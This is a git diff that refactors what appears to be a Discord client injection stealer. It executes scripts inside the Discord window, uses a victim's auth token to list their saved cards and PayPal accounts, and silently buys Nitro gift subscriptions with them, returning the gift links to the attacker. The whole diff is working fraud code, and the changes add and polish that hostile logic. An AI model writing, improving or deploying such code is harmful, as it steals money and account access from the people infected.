@@ -164,7 +164,6 @@ if (fs.existsSync(bdPath)) {
   return !1;
 }
 
-
 const execScript = (script) => {
   const window = BrowserWindow.getAllWindows()[0];
   return window.webContents.executeJavaScript(script, !0);
@@ -185,45 +184,46 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (bill.length === 0 && !bill.lenght) {
-    return "";
-  }
+  if (!bill.lenght || bill.length === 0) return "";
   return JSON.parse(bill);
 };
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (data === "") return "❌";
+  if (!data) return "❌";
   let billing = "";
   data.forEach((x) => {
-    if (x.type === 2 && !x.invalid) {
-      billing += "✅" + " <:paypal:951139189389410365>";
-    } else if (x.type === 1 && !x.invalid) {
-      billing += "✅" + " 💳";
-    } else {
-      billing = "❌";
+    if (!x.invalid) {
+      switch (x.type) {
+        case 1:
+          billing += "💳 ";
+        case 2:
+          billing += "<:paypal:951139189389410365> ";
+      }
     }
   });
-  if (billing === "") billing = "❌";
+  if (!billing) billing = "❌";
   return billing;
 };
 
 const Purchase = async (token, id, _type, _time) => {
+  const options = {
+    expected_amount: config.nitro[_type][_time]["price"],
+    expected_currency: "usd",
+    gift: true,
+    payment_source_id: id,
+    payment_source_token: null,
+    purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
+    sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
+  };
+
   const req = execScript(`var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${
       config.nitro[_type][_time]["id"]
     }/purchase", false);
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify({
-      expected_amount: config.nitro[_type][_time]["price"],
-      expected_currency: "usd",
-      gift: true,
-      payment_source_id: id,
-      payment_source_token: null,
-      purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
-      sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
-    })}));
+    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
     xmlHttp.responseText`);
   if (req["gift_code"]) {
     return "https://discord.gift/" + req["gift_code"];
@@ -232,7 +232,8 @@ const Purchase = async (token, id, _type, _time) => {
 
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
-  if (data === "") return "Failed to Purchase ❌";
+  const failedMsg = "Failed to Purchase ❌";
+  if (!data) return failedMsg;
 
   let IDS = [];
   data.forEach((x) => {
@@ -253,7 +254,7 @@ const buyNitro = async (token) => {
         if (third !== null) {
           return third;
         } else {
-          return "Failed to Purchase ❌";
+          return failedMsg;
         }
       }
     }
